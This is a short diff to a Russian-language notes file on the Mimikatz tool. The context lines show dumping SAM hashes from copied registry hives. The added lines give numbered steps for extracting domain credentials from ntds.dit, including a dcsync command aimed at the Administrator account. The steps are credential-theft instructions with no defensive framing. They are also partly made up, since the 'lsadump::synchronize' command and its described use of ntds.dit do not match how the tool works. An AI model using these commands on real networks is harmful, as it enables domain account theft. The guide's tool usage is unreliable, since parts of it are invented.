@@ -29,4 +29,15 @@ lsadump::sam /system:C:\Share-Server\files\SYSTEM /sam:C:\Share-Server\files\SAM
 - `token::whoami` - выводит информацию о текущем пользователе.
 
 
+Для получения данных из ntds.dit, аналогично команде lsadump::sam в инструменте Mimikatz, можно использовать следующие команды:
 
+1. Загрузите ntds.dit в память с помощью команды "lsadump::synchronize". Например:
+```
+mimikatz # lsadump::synchronize /system:C:\Windows\system32\config\system /ntds:C:\Windows\NTDS\ntds.dit
+```
+
+2. Используйте команду "lsadump::dcsync" для извлечения данных из базы данных ntds.dit. Например:
+```
+mimikatz # lsadump::dcsync /user:Administrator
+```
+где "Administrator" - это имя пользователя, данные которого вы хотите получить.
